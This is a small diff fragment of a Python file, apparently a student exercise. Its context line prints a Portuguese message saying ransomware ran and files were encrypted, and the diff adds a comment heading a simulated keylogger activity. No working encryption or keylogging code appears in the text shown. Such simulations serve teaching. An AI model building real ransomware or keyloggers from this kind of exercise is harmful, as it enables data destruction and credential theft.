@@ -53,4 +53,8 @@ def main():
     print("Ransoware executado! Arquivos criptografados!")   
 
 if __name__ == "__main__":
-    main()          
+    main() 
+
+#Atividade Keylogger Simulado
+
+
